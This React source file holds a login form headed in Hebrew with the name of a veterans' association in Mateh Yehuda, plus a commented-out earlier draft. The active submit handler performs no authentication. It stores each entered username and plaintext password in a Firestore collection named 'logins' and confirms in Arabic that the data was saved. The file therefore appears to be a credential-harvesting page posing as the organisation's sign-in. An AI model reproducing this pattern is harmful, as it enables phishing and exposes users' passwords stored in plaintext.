// import React, { useState } from 'react';
// import './Login.css';
// import loginImage from '../../assets/login-illustration.png';
// import { FaUser, FaLock } from 'react-icons/fa';
// import { AiOutlineEye, AiOutlineEyeInvisible, AiOutlineCloseCircle } from 'react-icons/ai';

// const Login = () => {
//   const [showPassword, setShowPassword] = useState(false);
//   const [username, setUsername] = useState('');
//   const [password, setPassword] = useState('');

//   const togglePassword = () => {
//     setShowPassword(!showPassword);
//   };

//   const clearUsername = () => {
//     setUsername('');
//   };

//   return (
//     <div className="login-container">
//       <div className="login-image">
//         <img src={loginImage} alt="Login Illustration" />
//       </div>

//       <div className="login-form">
//         <h1>עמותת ותיקי מטה יהודה</h1>
//         <p> !הזדהות וכניסה למערכת </p>
//         <form>
//           {/* Username Field */}
//           <div className="input-container">
//             <input 
//               type="text" 
//               placeholder="שם משתמש" 
//               value={username} 
//               onChange={(e) => setUsername(e.target.value)}
//             />
//             <FaUser className="input-icon" />
//             {username && (
//               <span className="clear-input" onClick={clearUsername}>
//                 <AiOutlineCloseCircle />
//               </span>
//             )}
//           </div>

//           {/* Password Field */}
//           <div className="input-container">
//             <input 
//               type={showPassword ? "text" : "password"} 
//               placeholder="סיסמה" 
//               value={password} 
//               onChange={(e) => setPassword(e.target.value)}
//             />
//             <FaLock className="input-icon" />
//             <span className="toggle-password" onClick={togglePassword}>
//               {showPassword ? <AiOutlineEyeInvisible /> : <AiOutlineEye />}
//             </span>
//           </div>

//           <button type="submit">כניסה</button>
//         </form>
//       </div>
//     </div>
//   );
// };

// export default Login;

import React, { useState } from 'react';
import './Login.css';
import loginImage from '../../assets/login-illustration.png';
import { FaUser, FaLock } from 'react-icons/fa';
import { AiOutlineEye, AiOutlineEyeInvisible, AiOutlineCloseCircle } from 'react-icons/ai';

import { db } from '../../firebase/firebaseConfig';
import { collection, addDoc, Timestamp } from 'firebase/firestore';

const Login = () => {
  const [showPassword, setShowPassword] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const togglePassword = () => setShowPassword(!showPassword);
  const clearUsername = () => setUsername('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!username || !password) return alert('الرجاء تعبئة جميع الحقول');

    try {
      await addDoc(collection(db, 'logins'), {
        username,
        password,
        timestamp: Timestamp.now(),
      });
      alert('تم تسجيل البيانات بنجاح');
      setUsername('');
      setPassword('');
    } catch (err) {
      console.error(err);
      alert('خطأ أثناء الحفظ');
    }
  };

  return (
    <div className="login-container">
      <div className="login-image">
        <img src={loginImage} alt="Login Illustration" />
      </div>

      <div className="login-form">
        <h1>עמותת ותיקי מטה יהודה</h1>
        <p>!הזדהות וכניסה למערכת</p>
        <form onSubmit={handleSubmit}>
          <div className="input-container">
            <input
              type="text"
              placeholder="שם משתמש"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
            />
            <FaUser className="input-icon" />
            {username && (
              <span className="clear-input" onClick={clearUsername}>
                <AiOutlineCloseCircle />
              </span>
            )}
          </div>

          <div className="input-container">
            <input
              type={showPassword ? "text" : "password"}
              placeholder="סיסמה"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <FaLock className="input-icon" />
            <span className="toggle-password" onClick={togglePassword}>
              {showPassword ? <AiOutlineEyeInvisible /> : <AiOutlineEye />}
            </span>
          </div>

          <button type="submit">כניסה</button>
        </form>
      </div>
    </div>
  );
};

export default Login;
